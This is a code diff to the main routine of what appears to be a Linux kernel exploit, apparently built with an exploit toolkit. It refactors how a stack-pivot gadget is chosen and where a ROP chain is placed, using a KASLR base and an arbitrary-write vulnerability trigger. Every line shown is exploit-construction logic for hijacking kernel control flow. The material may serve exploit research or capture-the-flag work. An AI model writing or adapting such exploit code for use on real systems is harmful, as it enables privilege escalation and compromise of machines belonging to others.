@@ -112,6 +112,8 @@ int main(int argc, const char** argv) {
     stack_pivot->ApplyToPayload(payload, kaslr_base);
     *release_ptr = kaslr_base + stack_pivot->GetGadgetOffset();
 
+    auto stack_pivot_dst = stack_pivot->GetDestinationOffset();
+
     if (use_heap_buffer) {
         // puts ROP chain into a separate heap buffer and pivots RSP there
         auto pop_rsp = pivot_finder.GetPopRsp();
@@ -119,22 +121,25 @@ int main(int argc, const char** argv) {
             throw ExpKitError("could not find a pop rsp gadget");
         printf("[+] Selected POP RSP pivot: stack_change_before_rsp=%lu, next_rip_offset=%lu\n", pop_rsp->stack_change_before_rsp, pop_rsp->next_rip_offset);
 
-        payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + pop_rsp->address);
-        payload.Set(stack_pivot->GetDestinationOffset() + 8, heap_addr);
+        payload.Set(stack_pivot_dst, kaslr_base + pop_rsp->address);
+        payload.Set(stack_pivot_dst + 8, heap_addr);
 
         printf("[+] Writing ROP chain into heap address\n");
         trigger_vuln_arb_write(heap_addr, rop.GetData());
     } else {
         // Find a shift gadget that shifts stack at least by 0x30
-        auto shift_gadget = pivot_finder.FindShift(0x30, 0x48);
+        auto rop_offs_from = payload.FindEmpty(rop.GetData().size()) - stack_pivot_dst;
+        printf("[.] Trying to find a stack shift at least %lu bytes\n", rop_offs_from);
+
+        auto shift_gadget = pivot_finder.FindShift(rop_offs_from);
         if (!shift_gadget.has_value())
             throw ExpKitError("could not find a shift gadget");
         printf("[+] Selected stack shifting pivot: shift_amount=%lu, ret_offset=%lu\n", shift_gadget->shift_amount, shift_gadget->ret_offset);
 
         // TODO: make interface more similar, e.g. use GetGadgetOffset()
-        payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + shift_gadget->address);
+        payload.Set(stack_pivot_dst, kaslr_base + shift_gadget->address);
         // TODO: shifting is weird with this +8 for the current pointer
-        auto rop_offs = stack_pivot->GetDestinationOffset() + 8 + shift_gadget->ret_offset;
+        auto rop_offs = stack_pivot_dst + 8 + shift_gadget->ret_offset;
         payload.Set(rop_offs, rop.GetData());
     }
 
